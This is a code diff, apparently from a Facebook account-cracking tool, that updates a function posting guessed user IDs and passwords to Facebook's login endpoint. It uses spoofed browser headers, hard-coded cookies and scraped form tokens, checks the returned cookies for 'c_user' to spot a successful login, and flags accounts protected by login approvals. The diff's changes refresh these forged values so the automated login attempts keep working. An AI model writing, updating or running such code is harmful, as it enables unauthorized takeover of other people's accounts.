@@ -1378,37 +1378,44 @@ def x(uid,pwx,tl):
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'email': uid,
+            'display': '',
+            'isprivate': '',
+            'return_session': '',
+            'skip_api_login': '',
+            'signed_next': '',
+            'trynum': '3',
             'timezone': '-330',
-            'lgndim': 'eyJ3Ijo0OTEsImgiOjExMTksImF3Ijo0OTEsImFoIjoxMTE5LCJjIjoyNH0=',
-            'lgnrnd': '091519_jCCI',
-            'lgnjs': '1734369320',
-            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK',
-            'locale': 'en_GB',
-            'login_source': 'login_bluebar',
-            'guid': 'f7abbc2af3c32e5b6',
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'prefill_type': '',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0^%^3D',
+            'lgnrnd': '215315_O_0g',
+            'lgnjs': '1735192396',
+            'email': uid,
+            'prefill_contact_point': uid,
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'password',
+            'first_prefill_source': 'browser_dropdown',
+            'first_prefill_type': 'contact_point',
+            'had_cp_prefilled': 'true',
+            'had_password_prefilled': 'true',
+            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVqq^%^2FV^%^2FAAAAAFAC',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
             'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
-            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnYGji.AWUhkuoAaLY',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnbO9L.AWXC-uraSgc',
             'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
-            'wd': '1440x402',
             'ps_l': '1',
             'ps_n': '1',
-            'locale': 'en_GB',}
+            'wd': '1440x402',
+            'usida': 'eyJ2ZXIiOjEsImlkIjoiQXNwMzZ6NXI0YzBkNiIsInRpbWUiOjE3MzUxOTIzMzd9',
+            'locale': 'hi_IN',}
             headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate, br, zstd',
-            'Referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
+            'Referer': 'https://hi-in.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTkyMzYyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ^%^3D^%^3D&next',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://www.facebook.com',
+            'Origin': 'https://hi-in.facebook.com',
             'DNT': '1',
-            'Alt-Used': 'www.facebook.com',
+            'Alt-Used': 'hi-in.facebook.com',
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
             'Sec-Fetch-Dest': 'document',
@@ -1419,7 +1426,7 @@ def x(uid,pwx,tl):
             'Pragma': 'no-cache',
             'Cache-Control': 'no-cache',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://wwww.facebook.com/login/device-based/regular/login/?login_attempt=1'
+            url = 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
